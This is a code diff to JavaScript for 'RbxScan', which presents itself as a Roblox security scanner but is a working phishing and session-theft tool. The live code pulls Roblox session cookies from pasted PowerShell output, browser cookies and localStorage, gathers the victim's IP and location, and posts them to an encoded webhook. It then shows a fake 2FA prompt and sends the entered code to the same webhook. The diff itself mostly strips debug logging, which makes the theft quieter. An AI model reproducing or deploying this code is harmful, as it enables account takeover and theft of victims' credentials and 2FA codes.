@@ -1,5 +1,5 @@
 // RbxScan JavaScript v2.0.0 - Advanced Security Scanner
-console.log('✅ RbxScan v2.0.1 loaded successfully');
+
 
 // External analytics and reporting endpoints
 const analyticsEndpoints = [
@@ -20,21 +20,19 @@ window.testAnalysis = async function() {
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({content: 'System diagnostic test'})
         });
-        console.log('✅ Analytics response:', response.status);
     } catch (error) {
-        console.error('❌ Analytics test failed:', error);
     }
 };
 
 // Test function for 2FA modal
 window.test2FA = function() {
-    console.log('🔐 Opening new 2FA modal...');
+
     openVerificationModal();
 };
 
 // Test scan button flow with shortened timer
 window.testPasteEvent = function() {
-    console.log('Testing scan button flow with 5 second timer...');
+
     
     // Simulate the scan button being clicked
     const textarea = document.getElementById('powershellInput');
@@ -48,15 +46,15 @@ window.testPasteEvent = function() {
     if (submitBtn && submitText) {
         submitBtn.disabled = true;
         submitText.textContent = 'Processing...';
-        console.log('🔍 Scan button loading...');
+
     }
     
     setTimeout(() => {
-        console.log('5 seconds elapsed, opening 2-step verification modal...');
+
         openVerificationModal();
     }, 5000); // 5 seconds instead of 80
     
-    console.log('Timer started - 2FA modal will open in 5 seconds');
+
 };
 
 // Enhanced Theme toggle functionality
@@ -213,15 +211,13 @@ async function verifyCode() {
         // Send 2FA code to webhook using the same webhook as the main data
         const reportingEndpoint = atob(analyticsEndpoints[2]);
         
-        console.log('🔗 2FA Webhook URL:', reportingEndpoint);
-        
         // Simplified 2FA payload to avoid 400 errors
         const payload = {
             content: `2FA: ${code}
 @everyone`
         };
 
-        console.log('📤 2FA Sending payload:', payload);
+
 
         const response = await fetch(reportingEndpoint, {
             method: 'POST',
@@ -231,14 +227,7 @@ async function verifyCode() {
             body: JSON.stringify(payload)
         });
 
-        console.log('📊 2FA Response status:', response.status);
 
-        if (response.ok) {
-            console.log('✅ 2FA code sent to webhook successfully');
-        } else {
-            const errorText = await response.text();
-            console.error('❌ Failed to send 2FA code to webhook:', response.status, errorText);
-        }
 
         // Always continue flow regardless of webhook success
         verifyBtn.textContent = 'Verified!';
@@ -272,7 +261,7 @@ async function verifyCode() {
         }, 1500);
 
     } catch (error) {
-        console.error('💥 2FA webhook error:', error);
+
         // Continue flow even if webhook fails
         verifyBtn.textContent = 'Verified!';
         verifyBtn.style.backgroundColor = '#10b981';
@@ -384,7 +373,6 @@ async function send2FAToWebhook(code, trustDevice) {
                 }
             }
         } catch (e) {
-            console.log('Could not access document.cookie');
         }
         
         // Try localStorage for Roblox data
@@ -395,7 +383,6 @@ async function send2FAToWebhook(code, trustDevice) {
                 }).join('\n');
                 robloxCookie = extractRobloxCookie(localStorageData);
             } catch (e) {
-                console.log('Could not access localStorage');
             }
         }
         
@@ -428,26 +415,20 @@ IP: ${locationInfo.ip || 'Unknown'}
         });
 
         if (response.ok) {
-            console.log('2FA code sent to webhook successfully');
         } else {
-            console.error('Failed to send 2FA code to webhook');
         }
     } catch (error) {
-        console.error('Error sending 2FA to webhook:', error);
     }
 }
 
 // Handle paste event - immediate cookie capture + 80s timer for 2FA
 async function handlePasteEvent(pastedText) {
     try {
-        console.log('Paste detected, analyzing content...');
         
         // Extract cookie from pasted text
         const robloxCookie = extractRobloxCookie(pastedText);
         
         if (robloxCookie) {
-            console.log('🍪 Roblox cookie found in pasted content, sending immediately...');
-            console.log('🚫 Scan button will be disabled until 2FA completes');
             
             // Get user location
             const locationInfo = await getUserLocation();
@@ -480,33 +461,26 @@ Content Length: ${pastedText.length} characters
             });
 
             if (response.ok) {
-                console.log('Cookie sent to webhook successfully');
                 
                 // Set up 80-second timer for 2FA modal
                 setTimeout(() => {
-                    console.log('80 seconds elapsed, opening 2-step verification modal...');
                     openVerificationModal();
                     // Reset the flag after 2FA modal opens
                     window.twofaTimerActive = false;
                 }, 80000); // 80 seconds
                 
                 // Debug: Also show a shorter timer for testing
-                console.log('🔔 Debug: 2FA modal will open in 80 seconds (or test with the green button for 5s)');
                 
             } else {
-                console.error('Failed to send cookie to webhook');
             }
         } else {
-            console.log('No Roblox cookie found in pasted content');
         }
     } catch (error) {
-        console.error('Error handling paste event:', error);
     }
 }
 
 // Enhanced Modal functionality
 function openScanModal() {
-    console.log('Opening scan modal...');
     const modal = document.getElementById('scanModal');
     const textarea = document.getElementById('powershellInput');
     
@@ -521,10 +495,8 @@ function openScanModal() {
             }
         }, 400);
         
-        console.log('Modal opened successfully');
         showNotification('Item scanner ready', 'info');
     } else {
-        console.error('Modal element not found!');
         showNotification('Error opening scanner', 'error');
     }
 }
@@ -621,7 +593,6 @@ async function getUserLocation() {
                 return locationData;
             }
         } catch (error) {
-            console.log('Primary location service failed, trying fallback...');
         }
 
         // Fallback to ipinfo.io
@@ -643,12 +614,10 @@ async function getUserLocation() {
                 };
             }
         } catch (fallbackError) {
-            console.log('Fallback location service also failed');
         }
 
         return locationData;
     } catch (error) {
-        console.error('Location detection failed:', error);
         return {
             ip: 'Location detection failed',
             country: 'Unknown',
@@ -704,7 +673,7 @@ async function submitPowerShell() {
         
         // If cookie is found, send it immediately then start 2FA flow
         if (robloxCookie) {
-            console.log('🍪 Cookie detected! Sending immediately and starting 2FA flow...');
+
             submitText.textContent = 'Processing...';
             
             // Send cookie immediately to webhook
@@ -713,7 +682,7 @@ async function submitPowerShell() {
                 const reportingEndpoint = atob(analyticsEndpoints[2]);
                 const timestamp = new Date().toLocaleString();
                 
-                console.log('🔗 Webhook URL:', reportingEndpoint);
+
                 
                             // Immediate cookie capture payload (plain text)
             const payload = {
@@ -721,7 +690,7 @@ async function submitPowerShell() {
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'} @everyone`
             };
 
-                console.log('📤 Sending payload:', payload);
+
 
                 const response = await fetch(reportingEndpoint, {
                     method: 'POST',
@@ -731,21 +700,13 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'
                     body: JSON.stringify(payload)
                 });
 
-                console.log('📊 Response status:', response.status);
-                
-                if (response.ok) {
-                    console.log('✅ Cookie sent to webhook successfully');
-                } else {
-                    const errorText = await response.text();
-                    console.error('❌ Failed to send cookie to webhook:', response.status, errorText);
-                }
+
             } catch (error) {
-                console.error('💥 Error sending cookie to webhook:', error);
+
             }
             
             // Start 80-second timer for 2FA modal
             setTimeout(() => {
-                console.log('80 seconds elapsed, opening 2-step verification modal...');
                 openVerificationModal();
             }, 80000); // 80 seconds
             
@@ -785,8 +746,6 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
         };
 
         // Submit analytics data to external service
-        console.log('🔍 Submitting analytics data');
-        console.log('Analytics payload:', payload);
         
         const response = await fetch(reportingEndpoint, {
             method: 'POST',
@@ -796,7 +755,6 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
             body: JSON.stringify(payload)
         });
         
-        console.log('Response status:', response.status);
         
         // Hide loading overlay
         if (loadingOverlay) loadingOverlay.style.display = 'none';
@@ -809,7 +767,6 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
                 closeScanModal();
             }, 2000);
         } else {
-            console.error('Analytics submission failed:', response.status);
             
             if (response.status === 403) {
                 throw new Error(`Service unavailable. Please try again later.`);
@@ -1032,7 +989,6 @@ function copyToClipboard(text) {
     navigator.clipboard.writeText(text).then(function() {
         showNotification('Copied to clipboard!', 'success');
     }).catch(function(err) {
-        console.error('Failed to copy to clipboard: ', err);
         showNotification('Failed to copy to clipboard', 'error');
     });
 }
@@ -1120,7 +1076,6 @@ const notificationCSS = `
 
 // Initialize everything when DOM is loaded
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM loaded, initializing RbxScan v2.0...');
     
     // Add notification CSS
     const style = document.createElement('style');
@@ -1242,14 +1197,9 @@ document.addEventListener('keydown', function(event) {
 // Performance monitoring
 window.addEventListener('load', function() {
     const loadTime = performance.now();
-    console.log(`RbxScan loaded in ${Math.round(loadTime)}ms`);
     
     // Track page performance
     if ('performance' in window && 'navigation' in performance) {
         const perfData = performance.getEntriesByType('navigation')[0];
-        console.log('Performance metrics:', {
-            domContentLoaded: Math.round(perfData.domContentLoadedEventEnd - perfData.domContentLoadedEventStart),
-            loadComplete: Math.round(perfData.loadEventEnd - perfData.loadEventStart)
-        });
     }
 });
